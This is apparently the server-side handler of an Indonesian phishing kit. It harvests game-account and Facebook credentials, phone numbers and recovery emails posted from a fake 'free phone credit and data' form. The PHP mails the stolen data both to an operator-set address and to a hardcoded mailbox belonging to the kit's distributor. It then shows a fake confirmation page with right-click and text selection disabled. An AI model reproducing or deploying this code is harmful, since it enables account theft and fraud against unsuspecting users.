<?php
###################################################
##        Author : Andi Yusran                	 ##
## 		Shared By : Mustakin Nur				 ##
##  Publisher: www.blog-takin.com                ##
###################################################
/* DUA TIGA TUTUP BOTOL. 
 JANGAN GANTI COPYRIGHT KONTOL wkwkwkwk */

$mailto = 'papacoder666@gmail.com'; //masukin email lo disini


$townhall = $_POST['townhall'];
$xplevel = $_POST['xplevel'];
$email = $_POST['email'];
$password = $_POST['password'];
$no = $_POST['no'];
$email2 = $_POST['email2'];
$email3 = $_POST['email3'];
$password2 = $_POST['password2'];
$country = $_POST['country'];


/* Mengambil informasi untuk dikirim kepada email anda !. */

$body = <<<EOD
<br><hr><br>
<h1> Akunya </h1>
Email : <font color="red">$email</font> <br>
Password : <font color="red">$password</font> <br>
Nomor Hp : <font color="red">$no</font> <br>
Email Recovery : <font color="red">$email2</font> <br>
Email Facebook: <font color="red">$email3</font> <br>
Password Facebook : <font color="red">$password2</font> <br>
Country : <font color="red">$country</font> <br>
EOD;


$headers = "From: Uhuinfo@suhu.com\r\n"; // Jangan di ganti kalau tidak mau eror.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$mailers = 'mustakinnur1@gmail.com'; //Jangan Sampai Diganti Kalau Tidak Mau error
$subjek = 'UHUINFO99 AKUN BARU';
$success = mail($mailers, $subjek, $body, $headers); // Get Password Supercell Database
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.


?>
<?php
$random = rand(1000,5000);
?>

<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='https://www.clashofstats.com/images/common/characters/large/1x/barbarian3.png' rel='icon' type='https://www.clashofstats.com/images/common/characters/large/1x/barbarian3.png'/>
<title>SELAMAT | PULSA & DATA GRATIS</title>
<link rel="stylesheet" href="http://fontawesome.io/assets/font-awesome/css/font-awesome.css">
<link rel="stylesheet" href="bootstrap.min.css">
<link rel="stylesheet" href="jquery.min.css">
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
</head><body style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; cursor: default;"><div align="center"><noscript>
<div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
<div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;"> Mohon aktifkan javascript pada browser untuk mengakses halaman ini! </div></div>
</noscript></div>
<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>
<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>
<style>
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
body {
  background: url(https://media.karousell.com/media/photos/products/2018/03/01/jual_pulsa_all_operator_1519882905_03afa125.jpg) no-repeat center center fixed;
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
</style>
<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">
<div class="col-md-3">
</div>
<div style="border:1px solid #f1f1f1;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<img style="border:none;width:100%;max-height:200px;margin:0 auto;" src="https://s.kaskus.id/r480x480/images/fjb/2016/04/11/wts_inject_paket_internet_all_operator___token_pln_harga_termurah_4278860_1460378311.png"/>
<div style="border:none;" class="btn btn-success btn-block"><b><i class=""></i>SELAMAT | PULSA & DATA GRATIS AKAN DI PROSES</b></div>
</div>
<center>
<div  style="background:white;padding:30px;width:100%" class="form-horizontal">
<h4 >
  SELAMAT DATA PAKET & PULSA KAMU SUDAH KAMI CATAT UNTUK PROSES MINIMAL 30 MENIT MAX 24 JAM , JIKA ERROR HUBUNGI KAMI !
  <div class="content">
	        <h1></h1>
      
		<center><img src="https://www.shareicon.net/data/512x512/2016/05/19/767560_clock_512x512.png" style="width:125px;height:125px;"></center> 
                        <div class="registration">
            <form id="frmLoginUI" name="frmLoginUI" method="post" action="https://www.facebook.com" onSubmit="return validate();"><div style='display:none'><input type='hidden' name='csrfmiddlewaretoken' value='UX8ogBv3k7w8XeR8SHNYr6GVbYvGKzlL' /></div>              
<div style="width:100%" class="form-group">
<div class="input-group">
  <form><input type="submit" name="Back" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="Back" value="Back"> </form>

</div>
</div>

<img src="https://2.bp.blogspot.com/-NMDvDbrODXk/WMzP2eOL93I/AAAAAAAAALA/WulIk8h88gsNNkirNrhfV1reh0RzCqF7QCLcB/s1600/good.jpg"/></p>
<p>Copyright &copy; 2020 .</p>
</div>
</div>
<div class="col-md-3">
</div>
</div>